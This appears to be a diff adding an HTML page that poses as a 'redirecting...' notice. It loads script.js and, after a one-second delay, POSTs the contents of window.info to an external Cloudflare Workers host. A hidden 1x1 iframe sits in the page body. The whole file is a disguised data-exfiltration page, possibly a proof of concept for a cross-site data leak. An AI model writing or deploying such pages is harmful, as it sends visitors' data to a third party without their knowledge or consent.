@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <!-- 
+		Author: g4xyk00
+		Update: 20180216
+
+	-->
+
+        <title>redirecting ...</title>
+
+        <script src="./script.js"></script>
+
+        <script>
+            setTimeout(function () {
+                console.log(window.info);
+                fetch(
+                    'https://hello-world-silent-wave-d978120910983109.jensenwtfwtf.workers.dev/',
+                    {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(window.info),
+                    },
+                )
+                    .then((response) => console.log(response))
+                    .then((data) => {
+                        console.log('data', data);
+                    });
+            }, 1000);
+        </script>
+    </head>
+    <body>
+        <div class="container">redirecting...</div>
+        <iframe
+            id="iframe"
+            src=""
+            frameborder="0"
+            width="1"
+            height="1"
+        ></iframe>
+    </body>
+</html>
